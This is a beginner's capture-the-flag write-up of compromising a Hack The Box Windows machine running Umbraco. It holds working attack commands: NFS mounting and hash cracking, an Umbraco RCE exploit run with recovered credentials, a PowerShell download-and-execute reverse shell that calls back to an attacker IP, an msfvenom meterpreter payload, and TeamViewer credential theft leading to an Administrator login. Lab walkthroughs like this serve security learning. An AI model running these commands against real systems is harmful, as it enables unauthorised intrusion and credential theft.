This is my first ever write-up as a beginner into the pen-testing landscape so please bare with me.

My first go to is an nmap scan:

sudo nmap 10.10.10.180 -sV -sC -Pn --disable-arp-ping -vv

I like to use these commands as my first scan:
-sV - enumerates the services so I can understand what is running on each port
-sC - enumerates the services further which gives me more information about each port
-Pn / --disable-arp-ping - helps to provide a stealthier scan for when it comes to real engagements

Here we can see straigtaway that anonymous log in is allowed which we will be able to take advantage of

![alt text](image-1.png)
Here we can see a http webpage is present so we can use this to further enumerate through web browsers, and domain enumeration

![alt text](image-2.png)
Here we can see NFS shares which we may be able to access


First I am going to attempt to connect to anonymous ftp to see what i can gather.
As far as I can see there is nothing on this server

Second I am going to take a look at the web page to gather as much info as i can.

When I navigate to the web page I can see something that looks like an online shop and blog for a company Acme - based in Denmark.

I notice an Intranet section on website which may come in useful.

I am going to create my own custom word list to use to find any subdirectories on this webpage using;
cewl http://10.10.10.180/ -w wordlist.txt

I will now use feroxbuster to find subdomains which showed me;
10.10.10.180/umbraco which led to a log in page which may be useful for later

Now I am going to mount the NFS shares 

showmount -e 10.10.10.180
which gives us /site_backups (everyone)

I now do the following commands:
mkdir mount
sudo mount -t nfs 10.10.10.180:site_backups mount -o nolock

this will now give me access to this share on my local machine

Searching the share I entered the umbraco folder and explored, could not find anything useful

https://stackoverflow.com/questions/36979794/umbraco-database-connection-credentials?source=post_page-----66fc6354117e--------------------------------

Found this web page which directed me to the umbraco database credentials

I used the string umbraco command which allowed me to find an admin username of "admin"
I then used grep admin* -A 10 to try and locate any passwords will filtering out uneeded text

One thing eventually stood out
adminAdministratorsCADMOSKTPIURZ:5F7

Looking further I can also see strings saying "hashalgorithm SHA1 or HMACSHA256" could this be the key to the password?

Lets us hashid on one of these hashes and then try to crack this
hashid 'b8be16afba8c314ad33d812f22a04991b90e2aaa'
shows SHA-1

now we will try to crack with hashcat

hashcat -m 100 'b8be16afba8c314ad33d812f22a04991b90e2aaa' /usr/share/wordlists/rockyou.txt  --show

This cracked the hash very quickly providing us with a password for admin@htb.local

Bingo we now have access

we have now found Umbraco version 7.12.4

searching this i found a aspx upload exploit on metasploit
let use this to gain access
make sure to change the options within msf to get this to work for you

After trying this exploit, this no longer seems to work however there is another exploit on exploitDB that allowd for RCE so lets try this

![alt text](image-3.png)
using the command whoami has shown that this exploit works and that we can use this to potentially get a shell

so lets create a listener using nc on port 4444

now lets get a revshell one liner from revshells.com

i will use the nc mkfifo rev shell putting me into sh

however this does not work so lets see if we can open powershell or cmd and get it to execute commands

using -c powershell.exe -a "ls C:/" allows us to see the directory

so we can now use this to hunt the user.txt flag
python3 49488.py -u admin@htb.local -p baconandcheese -i 'http://10.10.10.180' -c powershell.exe -a "type C:/Users/Public/Desktop/user.txt"


now we need to try and priv esc so we can access the admin flag

I noticed that teamviewer seems to be present so lets see if it is installed using tasklist /svc

teamviwer 7 lets look for any exploits
TeamViewer 11.0.65452 (x64) - Local Credentials Disclosure

now lets go back to our best friend msfconsole to see if it is preloaded

I found a post exploit for teamviewer passwords, perfect!

set the options
for this to work we need to gain a shell

we need a way to get a script onto the server in order to get the reverse shell

lets use the exploit/multi/script/web_delivery module in msf

make sure you set lhost to your machine
change the payload
change the exploit target

copy the command it tells you into your python script and execute

the stages should deliver and you should gain a shell

for some reason my final stage kept failing to send so I did some research and found another way to get a shell

https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1

we edit this and add
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.12 -Port 4400

now lets set up a python server in the directory of this script so it can be downloade and set up a lsitener on port 4400

execute this using this command:
"IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.12:8000/reverse.ps1')"

and a shell is gained, now we can start to do the teamviewer exploit

now lets make a msfvenom payload
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.16.12 lport=6666 -f exe > meterpreter


set the msfconsole to exploit/multi/handler match the lports and exploit

now as we still have the python web server running lets download our meterpreter payload using (Ensure you are in temp folder)
Invoke-WebRequest "http://10.10.16.12:8000/meterpreter.exe" -Outfile met.exe

now lets run this ./met.exe and we have a meterpreter shell

lets background this and use the teamviewer exploit

use post/windows/gather/credentials/teamviewer_passwords
set options

and exploit

1 password found but lets explore the directories in teamviewer
!R3m0te!

lets check for reused password (Bit of a cheat as their is only one other user)

use evil-winrm -i 10.10.10.180 -u Administrator -p (Password)

we have access and now we have the administrator flag

As i am starting out i did use other walkthroughs to help when I got stuck, this is all part of how you learn - go as far as you can by yourself and then get help - you will learn the patterns and what to look for eventually
